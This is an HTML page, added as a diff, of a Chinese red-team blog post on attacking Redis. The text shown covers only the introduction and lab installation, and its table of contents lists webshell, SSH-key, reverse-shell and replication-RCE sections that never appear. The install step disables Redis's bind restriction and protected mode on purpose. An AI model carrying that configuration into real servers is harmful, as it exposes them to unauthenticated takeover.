@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>数据库攻防之Redis渗透基础 - T0x1c</title>
+
+  
+    <meta name="description" content="Redis是目前最热门的的非关系型数据库，目前在各大公司被大量应用且存在未授权访问以及弱口令漏洞，是我们在红队攻防领域值得研究的数据库之一。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据库攻防之Redis渗透基础">
+<meta property="og:url" content="https://toxic80l.github.io/post/dd582856/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Redis是目前最热门的的非关系型数据库，目前在各大公司被大量应用且存在未授权访问以及弱口令漏洞，是我们在红队攻防领域值得研究的数据库之一。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8A%E5%8D%884.29.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8A%E5%8D%884.37.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.00.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8810.59.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.02.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.03.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.18.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.19.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/QQ%E6%88%AA%E5%9B%BE20210924172156.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.32.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.04.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.34.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.38.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.48.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%883.25.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2022-04-10%2003.27.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%881.38.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%881.40.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.03.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.05.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.08.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.09.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.10.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.16.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.16.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%884.57.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.25.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.27.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.07.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.10.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.13.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.35.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.47.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.47.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.23.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.26.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.26.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.28.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.30.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.32.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.28.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.27.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.30.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.40.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.41.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.45.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.50.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.53.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.54.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.50.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.57.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%8811.02.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%8811.07.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%882.45.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%8811.10.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%8811.16.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%882.55.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.03.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.03.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.04.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.07.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.37.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.39.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.45.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.46.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%884.47.03.png">
+<meta property="article:published_time" content="2022-04-09T21:03:22.000Z">
+<meta property="article:modified_time" content="2022-04-13T19:51:38.781Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="数据库">
+<meta property="article:tag" content="redis">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8A%E5%8D%884.29.46.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Redis%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 Redis简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Redis%E5%AE%89%E8%A3%85"><span class="toc-text">0x02 Redis安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE"><span class="toc-text">Redis安装配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E8%BF%9E%E6%8E%A5"><span class="toc-text">Redis连接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E4%B8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-text">Linux下连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E4%B8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-text">Windows下连接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-text">Redis基础用法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Redis%E6%B8%97%E9%80%8F"><span class="toc-text">0x03 Redis渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E5%86%99webshell"><span class="toc-text">Redis写webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-text">写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5webshell"><span class="toc-text">检查webshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E5%86%99ssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95ssh"><span class="toc-text">Redis写ssh密钥登录ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AFssh"><span class="toc-text">开启ssh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5ssh%E5%AF%86%E9%92%A5"><span class="toc-text">写入ssh密钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%BD%95ssh"><span class="toc-text">登录ssh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-text">知识补充</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">利用计划任务反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">主从复制RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD"><span class="toc-text">主从复制工具下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE-1"><span class="toc-text">主从复制RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Redis-3-x%E7%89%88%E6%9C%AC%E4%B8%8B%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98"><span class="toc-text">Redis 3.x版本下使用问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">本地Redis主从复制RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD-1"><span class="toc-text">主从复制工具下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE-2"><span class="toc-text">主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-Redis%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">SSRF Redis反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%BA%90%E7%A0%81"><span class="toc-text">漏洞源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E6%80%9D%E8%B7%AF"><span class="toc-text">主要思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E6%B5%8B%E8%AF%95"><span class="toc-text">实践测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-Redis%E5%8F%8D%E5%BC%B9shell%E6%A8%A1%E6%8B%9F%E7%8E%AF%E5%A2%83"><span class="toc-text">SSRF Redis反弹shell模拟环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%8B%93%E5%B1%95"><span class="toc-text">知识拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RESP%E5%8D%8F%E8%AE%AE"><span class="toc-text">RESP协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="toc-text">Gopher协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Redis%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="toc-text">0x04 Redis安全防护</span></a></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-04-09T21:03:22.000Z">2022-04-10</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>数据库攻防之Redis渗透基础</span></h1>
+<p>Redis是目前最热门的的非关系型数据库，目前在各大公司被大量应用且存在未授权访问以及弱口令漏洞，是我们在红队攻防领域值得研究的数据库之一。<span id="more"></span></p>
+<h2 id="0x01-Redis简介"><a href="#0x01-Redis简介" class="headerlink" title="0x01 Redis简介"></a>0x01 Redis简介</h2><p>Redis（Remote Dictionary Server）是一个由 Salvatore Sanfillppo 写的 key-value 存储系统。是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API。通常被称为数据结构服务器，因为值（value）可以是字符串（string）、哈希（hash）、列表（list）、集合（sets）和有序集合（sorted sets）等类型。</p>
+<p>Redis作为一个开源的高性能键值对数据库，是目前最热门的的非关系型数据库，默认端口是6379。它的优势也非常明显，最为突出的点就是性能极高，以下为 Redis 的特点及优点：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">、Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</span></span><br><span class="line"><span class="number">2</span><span class="string">、Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</span></span><br><span class="line"><span class="number">3</span><span class="string">、Redis能读的速度是110000次/s,写的速度是81000次/s</span> <span class="string">。</span></span><br><span class="line"><span class="number">4</span><span class="string">、Redis支持二进制案例的</span> <span class="string">Strings,</span> <span class="string">Lists,</span> <span class="string">Hashes,</span> <span class="string">Sets</span> <span class="string">及</span> <span class="string">Ordered</span> <span class="string">Sets</span> <span class="string">数据类型操作。</span></span><br><span class="line"><span class="number">5</span><span class="string">、Redis的所有操作都是原子性的，意思就是要么成功执行要么失败完全不执行。单个操作是原子性的。多个操作也支持事务，即原子性，通过MULTI和EXEC指令包起来。</span></span><br></pre></td></tr></table></figure>
+
+<p>由于Redis在大公司被大量应用，在互联网上已经出现利用 Redis 未授权漏洞的病毒进行自动攻击，攻击成功后会对内网进行扫描、控制、感染应用来挖矿、勒索等恶意行为。也存在安全大牛通过对 redis 感染 Linux 版本的勒索病毒相关分析<br><strong>参考文章：<a target="_blank" rel="noopener" href="https://www.sohu.com/a/143409075_765820">https://www.sohu.com/a/143409075_765820</a></strong></p>
+<h2 id="0x02-Redis安装"><a href="#0x02-Redis安装" class="headerlink" title="0x02 Redis安装"></a>0x02 Redis安装</h2><h3 id="Redis安装配置"><a href="#Redis安装配置" class="headerlink" title="Redis安装配置"></a>Redis安装配置</h3><p><strong>官方网站：<a target="_blank" rel="noopener" href="https://redis.io/">https://redis.io/</a></strong><br>我们可在官网下载 Redis<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8A%E5%8D%884.29.46.png" alt="截屏2021-10-26 上午4.29.46"></p>
+<p>在 kali 中直接下载安装，也可以通过以下命令进行安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz </span><br><span class="line">tar xzf redis-3.2.0.tar.gz </span><br><span class="line"><span class="built_in">cd</span> redis-3.2.0 </span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8A%E5%8D%884.37.44.png" alt="截屏2021-10-26 上午4.37.44"></p>
+<p>修改配置文件<code>redis.conf</code>如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份redis配置</span></span><br><span class="line">cp redis.conf redis.conf.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改redis配置</span></span><br><span class="line">redis.conf:</span><br><span class="line"><span class="comment">#bind 127.0.0.1 注释后表示任意机器都能登录</span></span><br><span class="line">protected-mode = no 关闭安全配置</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制修改的配置到目标文件夹下</span></span><br><span class="line">cp redis.conf ./src/redis.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动redis服务</span></span><br><span class="line">./src/redis-server redis.conf </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.00.33.png" alt="截屏2021-10-31 下午11.00.33"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8810.59.09.png" alt="截屏2021-10-31 下午10.59.09"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.02.19.png" alt="截屏2021-10-31 下午11.02.19"></p>
+<p>添加环境变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/root/Desktop/redis-3.2.0/src:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p>查看6379端口是否已开放，如开放说明启动成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntlp</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.03.58.png" alt="截屏2021-10-31 下午11.03.58"></p>
+<p>为了方便测试我搭建了两个测试环境，分别如下：</p>
